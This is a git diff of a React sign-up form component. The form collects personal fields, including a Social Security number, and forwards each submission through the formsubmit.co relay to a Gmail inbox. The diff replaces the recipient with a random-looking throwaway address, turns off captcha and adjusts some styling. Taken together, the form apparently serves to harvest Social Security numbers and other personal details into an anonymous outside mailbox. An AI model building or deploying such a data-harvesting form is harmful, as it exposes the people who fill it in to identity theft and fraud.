@@ -49,7 +49,7 @@ export default function SurveyForm() {
     const formData = new FormData(form)
 
     try {
-      const response = await fetch("https://formsubmit.co/ajax/Movewell4@gmail.com", {
+      const response = await fetch("https://formsubmit.co/ajax/axsaxsavdsxsa4432@gmail.com", {
         method: "POST",
         body: formData,
         headers: {
@@ -103,8 +103,8 @@ export default function SurveyForm() {
   }
 
   return (
-    <div className="min-h-screen flex items-center justify-center p-4 bg-white">
-      <div className="w-full md:w-3/5 bg-white shadow-lg rounded-lg p-8">
+    <div className="min-h-screen flex items-center justify-center bg-white">
+      <div className="w-full md:w-3/5 bg-white rounded-lg p-8">
         <form onSubmit={handleSubmit} className="space-y-6">
           <input type="hidden" name="_captcha" value="false" />
           <h1 className="text-4xl font-semibold text-center mb-4">Sign Up Form</h1>
@@ -160,14 +160,10 @@ export default function SurveyForm() {
                   type={key === "Email" ? "email" : key === "SocialSecurityNumber" ? "password" : "text"}
                   value={formData[key as keyof FormData] as string}
                   onChange={handleInputChange}
-                  className="w-full p-2 border border-gray-300 rounded"
+                  className="w-full p-2 border-b-2 border-gray-400 outline-none focus:border-blue-500 transition"
                   required
                 />
               )}
-
-              <span className="inline-block bg-gray-200 text-gray-700 px-2 py-1 rounded-full text-sm mt-1">
-                Required
-              </span>
             </div>
           ))}
 
@@ -188,4 +184,3 @@ export default function SurveyForm() {
     </div>
   )
 }
-
